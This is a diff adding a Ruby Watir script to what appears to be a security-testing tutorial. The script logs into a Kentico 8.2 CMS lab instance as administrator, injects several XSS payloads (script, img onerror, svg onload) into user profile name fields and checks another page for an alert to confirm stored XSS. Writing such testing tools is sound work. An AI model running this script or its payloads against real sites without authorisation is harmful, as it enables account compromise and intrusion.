@@ -314,6 +314,86 @@ One of scenarios I've faced is to exploit XSS a user profile fields and check th
 
 **xss_tab.rb**
 ```ruby
+#!/usr/bin/env ruby
+#
+#
+require 'watir-webdriver'
+require 'uri'
+
+# @url = URI.parse ARGV[0]
+@url = URI.parse "http://172.16.16.136/Kentico82/CMSModules/Membership/Pages/Users/User_Edit_General.aspx?userid=68&objectid=68"
+
+@browser = Watir::Browser.new :firefox
+@browser.window.resize_to(800, 600)
+# @browser.window.move_to(540, 165)
+@wait = Selenium::WebDriver::Wait.new(:timeout => 10)
+
+# @browser.goto "http://172.16.16.136/Kentico82/CMSPages/logon.aspx"
+@browser.goto "#{@url.scheme}://#{@url.host}/Kentico82/CMSPages/logon.aspx"
+
+@browser.text_field(name: 'Login1$UserName').set("administrator")
+@browser.text_field(name: 'Login1$Password').set("")
+sleep 0.5
+@browser.button(name: 'Login1$LoginButton').click 
+
+def sendpost(payload)
+  begin 
+
+    @browser.switch 
+    @browser.goto "#{@url.scheme}://#{@url.host}/#{@url.path}?#{@url.query}"
+    @wait.until {@browser.text_field(id: 'm_c_txtFullName').exists?}
+    @browser.text_field(id: 'm_c_txtFullName').set(payload)
+    @browser.text_field(id: 'm_c_txtFirstName').set(payload)
+    @browser.text_field(id: 'm_c_txtMiddleName').set(payload)
+    @browser.text_field(id: 'm_c_txtLastName').set(payload)
+    @browser.button(name: 'm$actionsElem$editMenuElem$menu$menu_HA_0').click
+    
+  rescue Selenium::WebDriver::Error::UnhandledAlertError
+    @browser.refresh
+    @wait.until {@browser.alert.exists?}
+  end
+end
+
+payloads = 
+  [ 
+    "<video src=x onerror=alert(1);>",
+    "<img src=x onerror='alert(2)'>",
+    "<script>alert(3)</script>",
+    "<svg/OnlOad=prompt(4)>",
+    "javascript:alert(5)",
+    "alert(/6/.source)"
+  ]
+
+
+puts "[*] Exploitation start"
+puts "[*] Number of payloads: #{payloads.size} payloads" 
+
+@browser.send_keys(:control, 't')
+@browser.goto "http://172.16.16.136/Kentico82/specialpages/user/silver.aspx"
+@browser.switch 
+
+payloads.each do |payload|
+  
+  @browser.send_keys(:alt, '1')
+  sendpost payload
+  puts "[*] Sending to '#{@browser.title}' Payload : #{payload}"
+  @browser.send_keys(:alt, '2')
+  @browser.switch 
+  @browser.refresh
+  puts "[*] Checking Payload Resutl on #{@browser.title}"
+  
+  if @browser.alert.exists? 
+    @browser.alert.ok
+    puts 
+    puts "[+] Exploit found!: " + payload
+    @browser.close
+    exit 0
+  end
+  
+end 
+
+@browser.close
+puts
 
 ```
 
